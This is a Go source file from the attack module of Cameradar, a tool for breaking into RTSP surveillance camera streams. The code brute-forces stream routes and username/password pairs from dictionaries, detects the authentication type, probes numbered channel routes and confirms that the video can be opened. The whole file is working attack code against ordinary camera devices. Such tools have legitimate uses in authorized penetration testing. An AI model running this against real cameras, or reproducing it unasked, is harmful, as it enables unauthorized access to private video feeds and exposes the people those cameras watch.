package attack

import (
	"context"
	"errors"
	"fmt"
	"slices"
	"time"

	"github.com/Ullaakut/cameradar/v6"
	"github.com/bluenviron/gortsplib/v5/pkg/base"
	"github.com/bluenviron/gortsplib/v5/pkg/liberrors"
)

// Route that should never be a constructor default.
const dummyRoute = "/0x8b6c42"

const maxIncrementalRouteAttempts = 32

// Dictionary provides dictionaries for routes, usernames and passwords.
type Dictionary interface {
	Routes() []string
	Usernames() []string
	Passwords() []string
}

// Reporter reports progress and results of the attacks.
type Reporter interface {
	Start(step cameradar.Step, message string)
	Done(step cameradar.Step, message string)
	Progress(step cameradar.Step, message string)
	Error(step cameradar.Step, err error)
	Debug(step cameradar.Step, message string)
}

// Attacker attempts to discover routes and credentials for RTSP streams.
type Attacker struct {
	dictionary     Dictionary
	reporter       Reporter
	attackInterval time.Duration
	timeout        time.Duration
}

// New builds an Attacker with the provided dependencies.
func New(dict Dictionary, attackInterval, timeout time.Duration, reporter Reporter) (Attacker, error) {
	if dict == nil {
		return Attacker{}, errors.New("dictionary is required")
	}

	return Attacker{
		dictionary:     dict,
		attackInterval: attackInterval,
		timeout:        timeout,
		reporter:       reporter,
	}, nil
}

// Attack attacks the given targets and returns the accessed streams.
func (a Attacker) Attack(ctx context.Context, targets []cameradar.Stream) ([]cameradar.Stream, error) {
	if len(targets) == 0 {
		return nil, errors.New("no stream found")
	}

	streams, err := a.attackRoutesPhase(ctx, targets)
	if err != nil {
		return streams, err
	}

	streams, err = a.detectAuthPhase(ctx, streams)
	if err != nil {
		return streams, err
	}

	streams, err = a.attackCredentialsPhase(ctx, streams)
	if err != nil {
		return streams, err
	}

	streams, err = a.validateStreamsPhase(ctx, streams)
	if err != nil {
		return streams, err
	}

	// Some cameras run an inaccurate version of the RTSP protocol which prioritizes 401 over 404.
	// For these cameras, running another route attack solves the problem.
	if !needsReattack(streams) {
		return streams, nil
	}
	streams, err = a.reattackRoutes(ctx, streams)
	if err != nil {
		return streams, err
	}

	return streams, nil
}

func (a Attacker) attackRoutesPhase(ctx context.Context, targets []cameradar.Stream) ([]cameradar.Stream, error) {
	a.reporter.Start(cameradar.StepAttackRoutes, "Attacking RTSP routes")
	routeAttempts := (len(a.dictionary.Routes()) + 1) * len(targets)
	if routeAttempts > 0 {
		a.reporter.Progress(cameradar.StepAttackRoutes, cameradar.ProgressTotalMessage(routeAttempts))
	}

	streams, err := runParallel(ctx, targets, func(ctx context.Context, target cameradar.Stream) (cameradar.Stream, error) {
		return a.attackRoutesForStream(ctx, target, true)
	})
	if err != nil {
		a.reporter.Error(cameradar.StepAttackRoutes, err)
		return streams, fmt.Errorf("attacking routes: %w", err)
	}
	updateSummary(a.reporter, streams)
	a.reporter.Done(cameradar.StepAttackRoutes, "Finished route attacks")

	return streams, nil
}

func (a Attacker) detectAuthPhase(ctx context.Context, streams []cameradar.Stream) ([]cameradar.Stream, error) {
	a.reporter.Start(cameradar.StepDetectAuth, "Detecting authentication methods")
	if len(streams) > 0 {
		a.reporter.Progress(cameradar.StepDetectAuth, cameradar.ProgressTotalMessage(len(streams)))
	}
	streams, err := a.detectAuthMethods(ctx, streams)
	if err != nil {
		a.reporter.Error(cameradar.StepDetectAuth, err)
		return streams, fmt.Errorf("detecting authentication methods: %w", err)
	}
	updateSummary(a.reporter, streams)
	a.reporter.Done(cameradar.StepDetectAuth, "Authentication detection complete")

	return streams, nil
}

func (a Attacker) attackCredentialsPhase(ctx context.Context, streams []cameradar.Stream) ([]cameradar.Stream, error) {
	a.reporter.Start(cameradar.StepAttackCredentials, "Attacking credentials")
	credentialsAttempts := len(streams) * len(a.dictionary.Usernames()) * len(a.dictionary.Passwords())
	if credentialsAttempts > 0 {
		a.reporter.Progress(cameradar.StepAttackCredentials, cameradar.ProgressTotalMessage(credentialsAttempts))
	}
	streams, err := runParallel(ctx, streams, a.attackCredentialsForStream)
	if err != nil {
		a.reporter.Error(cameradar.StepAttackCredentials, err)
		return streams, fmt.Errorf("attacking credentials: %w", err)
	}
	updateSummary(a.reporter, streams)
	a.reporter.Done(cameradar.StepAttackCredentials, "Credential attacks complete")

	return streams, nil
}

func (a Attacker) validateStreamsPhase(ctx context.Context, streams []cameradar.Stream) ([]cameradar.Stream, error) {
	a.reporter.Start(cameradar.StepValidateStreams, "Validating streams")
	if len(streams) > 0 {
		a.reporter.Progress(cameradar.StepValidateStreams, cameradar.ProgressTotalMessage(len(streams)))
	}
	streams, err := runParallel(ctx, streams, func(ctx context.Context, target cameradar.Stream) (cameradar.Stream, error) {
		return a.validateStream(ctx, target, true)
	})
	if err != nil {
		a.reporter.Error(cameradar.StepValidateStreams, err)
		return streams, fmt.Errorf("validating streams: %w", err)
	}
	updateSummary(a.reporter, streams)
	a.reporter.Done(cameradar.StepValidateStreams, "Stream validation complete")

	return streams, nil
}

func (a Attacker) reattackRoutes(ctx context.Context, streams []cameradar.Stream) ([]cameradar.Stream, error) {
	a.reporter.Progress(cameradar.StepAttackRoutes, "Re-attacking routes for partial results")
	updated, err := runParallel(ctx, streams, func(ctx context.Context, target cameradar.Stream) (cameradar.Stream, error) {
		return a.attackRoutesForStream(ctx, target, false)
	})
	if err != nil {
		a.reporter.Error(cameradar.StepAttackRoutes, err)
		return streams, fmt.Errorf("attacking routes: %w", err)
	}

	updated, err = runParallel(ctx, updated, func(ctx context.Context, target cameradar.Stream) (cameradar.Stream, error) {
		return a.validateStream(ctx, target, false)
	})
	if err != nil {
		a.reporter.Error(cameradar.StepValidateStreams, err)
		return updated, fmt.Errorf("validating streams: %w", err)
	}
	updateSummary(a.reporter, updated)

	return updated, nil
}

func needsReattack(streams []cameradar.Stream) bool {
	for _, stream := range streams {
		if stream.RouteFound && stream.CredentialsFound && stream.Available {
			continue
		}
		return true
	}
	return false
}

type summaryUpdater interface {
	UpdateSummary(streams []cameradar.Stream)
}

func updateSummary(reporter Reporter, streams []cameradar.Stream) {
	updater, ok := reporter.(summaryUpdater)
	if !ok {
		return
	}
	updater.UpdateSummary(streams)
}

func (a Attacker) attackCredentialsForStream(ctx context.Context, target cameradar.Stream) (cameradar.Stream, error) {
	for _, username := range a.dictionary.Usernames() {
		for _, password := range a.dictionary.Passwords() {
			if ctx.Err() != nil {
				return target, ctx.Err()
			}

			a.reporter.Progress(cameradar.StepAttackCredentials, cameradar.ProgressTickMessage())
			ok, err := a.credAttack(target, username, password)
			if err != nil {
				target.CredentialsFound = false

				msg := fmt.Sprintf("credential attempt failed for %s:%d (%s:%s): %v", target.Address.String(), target.Port, username, password, err)
				a.reporter.Debug(cameradar.StepAttackCredentials, msg)

				return target, nil
			}

			if ok {
				target.CredentialsFound = true
				target.Username = username
				target.Password = password

				msg := fmt.Sprintf("Credentials found for %s:%d", target.Address.String(), target.Port)
				a.reporter.Progress(cameradar.StepAttackCredentials, msg)

				updated, err := a.tryIncrementalRoutes(ctx, target, target.Route(), true)
				if err != nil {
					return target, err
				}

				return updated, nil
			}
			time.Sleep(a.attackInterval)
		}
	}

	target.CredentialsFound = false
	return target, nil
}

func (a Attacker) attackRoutesForStream(ctx context.Context, target cameradar.Stream, emitProgress bool) (cameradar.Stream, error) {
	if target.RouteFound {
		return target, nil
	}

	if emitProgress {
		a.reporter.Progress(cameradar.StepAttackRoutes, cameradar.ProgressTickMessage())
	}
	ok, err := a.routeAttack(target, dummyRoute)
	if err != nil {
		a.reporter.Debug(cameradar.StepAttackRoutes, fmt.Sprintf("route probe failed for %s:%d: %v", target.Address.String(), target.Port, err))
		return target, nil
	}
	if ok {
		target.RouteFound = true
		target.Routes = appendRouteIfMissing(target.Routes, "/")
		a.reporter.Progress(cameradar.StepAttackRoutes, fmt.Sprintf("Default route accepted for %s:%d", target.Address.String(), target.Port))
		return target, nil
	}

	for _, route := range a.dictionary.Routes() {
		select {
		case <-ctx.Done():
			return target, ctx.Err()
		case <-time.After(a.attackInterval):
		}

		if emitProgress {
			a.reporter.Progress(cameradar.StepAttackRoutes, cameradar.ProgressTickMessage())
		}
		ok, err := a.routeAttack(target, route)
		if err != nil {
			a.reporter.Debug(cameradar.StepAttackRoutes, fmt.Sprintf("route attempt failed for %s:%d (%s): %v", target.Address.String(), target.Port, route, err))
			return target, nil
		}
		if ok {
			target.RouteFound = true
			target.Routes = appendRouteIfMissing(target.Routes, route)
			a.reporter.Progress(cameradar.StepAttackRoutes, fmt.Sprintf("Route found for %s:%d -> %s", target.Address.String(), target.Port, route))

			updated, err := a.tryIncrementalRoutes(ctx, target, route, emitProgress)
			if err != nil {
				return target, err
			}
			target = updated
		}
	}

	return target, nil
}

func (a Attacker) detectAuthMethods(ctx context.Context, targets []cameradar.Stream) ([]cameradar.Stream, error) {
	streams, err := runParallel(ctx, targets, a.detectAuthMethod)
	if err != nil {
		return streams, err
	}

	for i := range streams {
		a.reporter.Progress(cameradar.StepDetectAuth, cameradar.ProgressTickMessage())

		var authMethod string
		switch streams[i].AuthenticationType {
		case cameradar.AuthNone:
			authMethod = "no"
		case cameradar.AuthBasic:
			authMethod = "basic"
		case cameradar.AuthDigest:
			authMethod = "digest"
		default:
			return streams, fmt.Errorf("unknown authentication method %d for %s:%d", streams[i].AuthenticationType, streams[i].Address.String(), streams[i].Port)
		}

		a.reporter.Progress(cameradar.StepDetectAuth, fmt.Sprintf("Detected %s authentication for %s:%d", authMethod, streams[i].Address.String(), streams[i].Port))
	}

	return streams, nil
}

func (a Attacker) detectAuthMethod(ctx context.Context, stream cameradar.Stream) (cameradar.Stream, error) {
	if ctx.Err() != nil {
		return stream, ctx.Err()
	}
	u, urlStr, err := buildRTSPURL(stream, stream.Route(), "", "")
	if err != nil {
		return stream, fmt.Errorf("building rtsp url: %w", err)
	}

	client, err := a.newRTSPClient(u)
	if err != nil {
		return stream, fmt.Errorf("starting rtsp client: %w", err)
	}
	defer client.Close()

	_, res, err := client.Describe(u)
	if err != nil {
		var badStatus liberrors.ErrClientBadStatusCode
		if errors.As(err, &badStatus) && res != nil && badStatus.Code == base.StatusUnauthorized {
			stream.AuthenticationType = authTypeFromHeaders(res.Header["WWW-Authenticate"])
			a.reporter.Debug(cameradar.StepDetectAuth, fmt.Sprintf("DESCRIBE %s RTSP/1.0 > %d", urlStr, badStatus.Code))
			return stream, nil
		}
		return stream, fmt.Errorf("performing describe request at %q: %w", urlStr, err)
	}

	if res != nil {
		a.reporter.Debug(cameradar.StepDetectAuth, fmt.Sprintf("DESCRIBE %s RTSP/1.0 > %d", urlStr, res.StatusCode))
	}

	stream.AuthenticationType = cameradar.AuthNone
	return stream, nil
}

// When no credentials are used, we expect 200, 401 or 403 status codes, which would mean either that the stream is
// unprotected and this is the correct route, or that it is protected and this is also a correct route.
func (a Attacker) routeAttack(stream cameradar.Stream, route string) (bool, error) {
	return a.routeAttackWithStatus(stream, route, func(code base.StatusCode) bool {
		return code == base.StatusOK || code == base.StatusUnauthorized || code == base.StatusForbidden
	})
}

// When credentials are given, we only expect a 200 status code, which confirms the combination of route and credentials.
func (a Attacker) routeAttackWithCredentials(stream cameradar.Stream, route string) (bool, error) {
	return a.routeAttackWithStatus(stream, route, func(code base.StatusCode) bool {
		return code == base.StatusOK
	})
}

func (a Attacker) routeAttackWithStatus(stream cameradar.Stream, route string, allowed func(base.StatusCode) bool) (bool, error) {
	u, urlStr, err := buildRTSPURL(stream, route, stream.Username, stream.Password)
	if err != nil {
		return false, fmt.Errorf("building rtsp url: %w", err)
	}

	code, err := a.describeStatus(u)
	if err != nil {
		return false, fmt.Errorf("performing describe request at %q: %w", urlStr, err)
	}

	a.reporter.Debug(cameradar.StepAttackRoutes, fmt.Sprintf("DESCRIBE %s RTSP/1.0 > %d", urlStr, code))
	return allowed(code), nil
}

func (a Attacker) tryIncrementalRoutes(ctx context.Context,
	target cameradar.Stream, route string,
	emitProgress bool,
) (cameradar.Stream, error) {
	match, ok := detectIncrementalRoute(route)
	if !ok {
		return target, nil
	}

	nextNumber := match.number + 1
	attempts := 0
	for {
		if attempts >= maxIncrementalRouteAttempts {
			a.reporter.Debug(cameradar.StepAttackRoutes, fmt.Sprintf(
				"incremental route attempts capped at %d for %s:%d",
				maxIncrementalRouteAttempts,
				target.Address.String(),
				target.Port,
			))
			return target, nil
		}

		select {
		case <-ctx.Done():
			return target, ctx.Err()
		case <-time.After(a.attackInterval):
		}

		nextRoute := buildIncrementedRoute(match, nextNumber)
		if slices.Contains(target.Routes, nextRoute) {
			if !match.isChannel {
				return target, nil
			}
			nextNumber++
			continue
		}

		if emitProgress {
			a.reporter.Progress(cameradar.StepAttackRoutes, cameradar.ProgressTickMessage())
		}

		ok, err := a.routeAttackWithCredentials(target, nextRoute)
		if err != nil {
			a.reporter.Debug(cameradar.StepAttackRoutes, fmt.Sprintf("incremental route attempt failed for %s:%d (%s): %v",
				target.Address.String(),
				target.Port,
				nextRoute,
				err,
			))
			return target, nil
		}
		attempts++
		if !ok {
			return target, nil
		}

		target.RouteFound = true
		target.Routes = appendRouteIfMissing(target.Routes, nextRoute)
		a.reporter.Progress(cameradar.StepAttackRoutes, fmt.Sprintf("Incremental route found for %s:%d -> %s", target.Address.String(), target.Port, nextRoute))

		if !match.isChannel {
			return target, nil
		}
		nextNumber++
	}
}

func appendRouteIfMissing(routes []string, route string) []string {
	if slices.Contains(routes, route) {
		return routes
	}
	return append(routes, route)
}

func (a Attacker) credAttack(stream cameradar.Stream, username, password string) (bool, error) {
	u, urlStr, err := buildRTSPURL(stream, stream.Route(), username, password)
	if err != nil {
		return false, fmt.Errorf("building rtsp url: %w", err)
	}

	code, err := a.describeStatus(u)
	if err != nil {
		return false, fmt.Errorf("performing describe request at %q: %w", urlStr, err)
	}

	a.reporter.Debug(cameradar.StepAttackCredentials, fmt.Sprintf("DESCRIBE %s RTSP/1.0 > %d", urlStr, code))
	return code == base.StatusOK || code == base.StatusNotFound, nil
}

func (a Attacker) validateStream(ctx context.Context, stream cameradar.Stream, emitProgress bool) (cameradar.Stream, error) {
	if emitProgress {
		defer a.reporter.Progress(cameradar.StepValidateStreams, cameradar.ProgressTickMessage())
	}

	if ctx.Err() != nil {
		return stream, ctx.Err()
	}

	u, urlStr, err := buildRTSPURL(stream, stream.Route(), stream.Username, stream.Password)
	if err != nil {
		return stream, fmt.Errorf("building rtsp url: %w", err)
	}

	client, err := a.newRTSPClient(u)
	if err != nil {
		return stream, fmt.Errorf("starting rtsp client: %w", err)
	}
	defer client.Close()

	desc, res, err := client.Describe(u)
	if err != nil {
		return a.handleDescribeError(stream, urlStr, err)
	}
	a.logDescribeResponse(urlStr, res)

	if desc == nil || len(desc.Medias) == 0 {
		return stream, fmt.Errorf("no media tracks found for %q", urlStr)
	}

	res, err = client.Setup(desc.BaseURL, desc.Medias[0], 0, 0)
	if err != nil {
		return a.handleSetupError(stream, urlStr, err)
	}

	a.logSetupResponse(urlStr, res)

	stream.Available = res != nil && res.StatusCode == base.StatusOK
	if stream.Available {
		a.reporter.Progress(cameradar.StepValidateStreams, fmt.Sprintf("Stream validated for %s:%d", stream.Address.String(), stream.Port))
	}

	return stream, nil
}

func (a Attacker) handleDescribeError(stream cameradar.Stream, urlStr string, err error) (cameradar.Stream, error) {
	var badStatus liberrors.ErrClientBadStatusCode
	if errors.As(err, &badStatus) && badStatus.Code == base.StatusServiceUnavailable {
		a.reporter.Progress(cameradar.StepValidateStreams, fmt.Sprintf("Stream unavailable for %s:%d (RTSP %d)",
			stream.Address.String(),
			stream.Port,
			badStatus.Code,
		))
		stream.Available = false
		return stream, nil
	}

	return stream, fmt.Errorf("performing describe request at %q: %w", urlStr, err)
}

func (a Attacker) handleSetupError(stream cameradar.Stream, urlStr string, err error) (cameradar.Stream, error) {
	var badStatus liberrors.ErrClientBadStatusCode
	if errors.As(err, &badStatus) {
		a.reporter.Debug(cameradar.StepValidateStreams, fmt.Sprintf("SETUP %s RTSP/1.0 > %d", urlStr, badStatus.Code))
		stream.Available = badStatus.Code == base.StatusOK
		return stream, nil
	}

	return stream, fmt.Errorf("performing setup request at %q: %w", urlStr, err)
}

func (a Attacker) logDescribeResponse(urlStr string, res *base.Response) {
	if res == nil {
		return
	}
	a.reporter.Debug(cameradar.StepValidateStreams, fmt.Sprintf("DESCRIBE %s RTSP/1.0 > %d", urlStr, res.StatusCode))
}

func (a Attacker) logSetupResponse(urlStr string, res *base.Response) {
	if res == nil {
		return
	}
	a.reporter.Debug(cameradar.StepValidateStreams, fmt.Sprintf("SETUP %s RTSP/1.0 > %d", urlStr, res.StatusCode))
}
